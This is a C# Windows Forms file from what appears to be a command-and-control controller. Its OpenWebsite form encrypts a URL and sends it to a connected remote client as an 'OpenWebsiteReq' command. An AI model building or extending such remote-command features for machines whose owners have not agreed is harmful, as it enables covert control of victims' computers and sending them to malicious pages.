using CNC.Core.Data;
using CNC.Core.Security;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Forms
{
    public partial class OpenWebsite : Form
    {
        private Client currentClient;
        public OpenWebsite(Client client)
        {
            currentClient = client;
            InitializeComponent();
        }

        private void btnExecute_Click(object sender, EventArgs e)
        {
            currentClient.Connection.SendObject<string>("OpenWebsiteReq", Cryptography.Encrypt(txtUrl.Text));
        }
    }
}
